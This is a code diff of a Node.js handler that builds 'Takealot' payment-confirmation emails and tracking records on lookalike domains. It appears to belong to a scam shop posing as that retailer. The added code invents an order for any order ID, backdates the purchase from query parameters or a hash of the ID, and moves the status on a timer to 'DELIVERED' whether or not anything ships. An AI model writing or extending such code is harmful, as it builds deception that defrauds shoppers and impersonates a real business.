@@ -80,9 +80,51 @@ async function getLatestOrder() {
   return orders[0];
 }
 
+function getStableOrderDates(orderId, reqQuery) {
+  // 1. Explicit timestamp passed from client localStorage/cookies/URL (?p= or ?received_date=)
+  const qDate = reqQuery && (reqQuery.received_date || reqQuery.p || reqQuery.date || reqQuery.created_at);
+  if (qDate) {
+    const num = Number(qDate);
+    const d = !isNaN(num) && num > 1000000000 ? new Date(num > 10000000000 ? num : num * 1000) : new Date(qDate);
+    if (!isNaN(d.getTime())) {
+      const del = new Date(d.getTime() + 8 * 86400000);
+      return { purchaseDate: d, deliveryDate: del };
+    }
+  }
+
+  // 2. Embedded timestamp in order ID (if 10-13 digits)
+  const digits = (orderId || '').replace(/\D/g, '');
+  if (digits.length >= 10) {
+    const tsSec = parseInt(digits.slice(0, 10), 10);
+    if (tsSec >= 1700000000 && tsSec <= 2100000000) {
+      const d = new Date(tsSec * 1000);
+      return { purchaseDate: d, deliveryDate: new Date(d.getTime() + 8 * 86400000) };
+    }
+    const tsMs = parseInt(digits.slice(0, 13), 10);
+    if (tsMs >= 1700000000000 && tsMs <= 2100000000000) {
+      const d = new Date(tsMs);
+      return { purchaseDate: d, deliveryDate: new Date(d.getTime() + 8 * 86400000) };
+    }
+  }
+
+  // 3. Fallback: Deterministic date derived from orderId hash anchored to a fixed campaign launch date
+  // This ensures that order T483800201638065 ALWAYS has the exact same purchase date and delivery date
+  // no matter which day it is checked (today, tomorrow, next week).
+  let hash = 0;
+  for (let i = 0; i < (orderId || '').length; i++) {
+    hash = ((hash << 5) - hash) + orderId.charCodeAt(i);
+    hash |= 0;
+  }
+  const baseMs = 1793181600000; // October 2026 anchor
+  const offset = Math.abs(hash % (24 * 3600 * 1000));
+  const d = new Date(baseMs + offset);
+  const del = new Date(d.getTime() + 8 * 86400000);
+  return { purchaseDate: d, deliveryDate: del };
+}
+
 function renderOrderPlainText(order) {
   const d = new Date(order.received_date || Date.now());
-  const del = new Date(order.delivery_date || (Date.now() + 7 * 86400000));
+  const del = new Date(order.delivery_date || (d.getTime() + 8 * 86400000));
 
   const daysShort = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
   const monthsShort = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
@@ -94,7 +136,7 @@ function renderOrderPlainText(order) {
   const customerName = order.customer_name || 'Customer';
   const orderNumber = order.order_id;
   const variant = 'Premium Black';
-  const trackUrl = `https://www.takealot-promo.online/track.html?order=${orderNumber}`;
+  const trackUrl = `https://takealotpromos-black.vercel.app/track.html?order=${orderNumber}&p=${d.getTime()}`;
 
   return [
     `TAKEALOT PAYMENT CONFIRMATION`,
@@ -126,7 +168,7 @@ function renderOrderPlainText(order) {
     `TRACK YOUR ORDER:`,
     `${trackUrl}`,
     ``,
-    `Need help? Find answers at https://www.takealot-promo.online`,
+    `Need help? Find answers at https://takealotpromos-black.vercel.app`,
     ``,
     `Regards,`,
     `The Takealot Team`,
@@ -153,7 +195,7 @@ async function ensureEmailSent(order, force = false) {
   try {
     const template = fs.readFileSync(path.join(process.cwd(), 'email.index'), 'utf8');
     const d = new Date(order.received_date || Date.now());
-    const del = new Date(order.delivery_date || (Date.now() + 7 * 86400000));
+    const del = new Date(order.delivery_date || (d.getTime() + 8 * 86400000));
     const daysShort = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
     const monthsShort = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
     const daysLong = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
@@ -308,7 +350,26 @@ module.exports = async function handler(req, res) {
       }
     }
 
-      const now = new Date().toISOString();
+    if (order && order.received_date) {
+      // Keep delivery strictly 8 days from original purchase date
+      const rec = new Date(order.received_date);
+      if (!isNaN(rec.getTime())) {
+        order.delivery_date = new Date(rec.getTime() + 8 * 86400000).toISOString();
+      }
+    }
+
+    if (!order) {
+      const dates = getStableOrderDates(orderId, req.query);
+      const purchaseIso = dates.purchaseDate.toISOString();
+      const deliveryIso = dates.deliveryDate.toISOString();
+
+      // Progressive status based on fixed days elapsed from purchase
+      const daysElapsed = Math.floor((Date.now() - dates.purchaseDate.getTime()) / 86400000);
+      let calculatedStatus = 'PROCESSING';
+      if (daysElapsed >= 4 && daysElapsed < 7) calculatedStatus = 'IN_TRANSIT';
+      else if (daysElapsed >= 7 && daysElapsed < 8) calculatedStatus = 'OUT_FOR_DELIVERY';
+      else if (daysElapsed >= 8) calculatedStatus = 'DELIVERED';
+
       order = {
         order_id: orderId,
         customer_name: (req.query.name || 'Customer').trim(),
@@ -319,18 +380,18 @@ module.exports = async function handler(req, res) {
         product_price: 999,
         currency: 'ZAR',
         product_image: 'https://takealotpromos-black.vercel.app/produto.png',
-        received_date: now,
-        delivery_date: new Date(Date.now() + 7 * 86400000).toISOString(),
-        tracking_url: 'https://takealotpromos-black.vercel.app/track.html?order=' + encodeURIComponent(orderId),
-        status: 'PROCESSING',
+        received_date: purchaseIso,
+        delivery_date: deliveryIso,
+        tracking_url: 'https://takealotpromos-black.vercel.app/track.html?order=' + encodeURIComponent(orderId) + '&p=' + dates.purchaseDate.getTime(),
+        status: calculatedStatus,
         status_history: [
-          { status: 'RECEIVED', timestamp: now },
-          { status: 'PAID', timestamp: now },
-          { status: 'PROCESSING', timestamp: now },
+          { status: 'RECEIVED', timestamp: purchaseIso },
+          { status: 'PAID', timestamp: purchaseIso },
+          { status: 'PROCESSING', timestamp: purchaseIso },
         ],
         email_status: 'PENDING',
         email_sent_at: null,
-        created_at: now,
+        created_at: purchaseIso,
       };
       if (REDIS_URL && REDIS_TOKEN) {
         try { await kv_set('order:' + orderId, order); } catch (_) {}
